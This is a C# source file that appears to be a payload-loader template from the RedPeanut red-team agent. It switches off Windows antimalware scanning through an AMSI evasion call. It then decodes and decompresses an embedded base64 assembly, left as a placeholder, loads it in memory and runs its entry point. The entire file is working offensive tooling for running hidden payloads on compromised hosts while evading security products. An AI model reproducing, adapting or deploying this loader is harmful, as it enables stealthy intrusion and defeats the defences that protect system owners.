using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;

class AssmblyLoader
{
    static string payload64 = @"#COMPRESSEDASSEMBLY#";
    static bool amsievasion = true;

    public static void Execute(string[] args)
    {
        RedPeanutAgent.Evasion.Evasion.Evade(amsievasion);

        try
        {
            System.Reflection.Assembly a = System.Reflection.Assembly.Load(getPayload(payload64));
            a.EntryPoint.Invoke(null, new Object[] { args });
        }
        catch (System.Exception e)
        {
            Console.WriteLine("Error: " + e.Message);

        }
    }

    public static byte[] getPayload(string payload)
    {

        return DecompressDLL(Convert.FromBase64String(payload));
    }

    public static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }
}

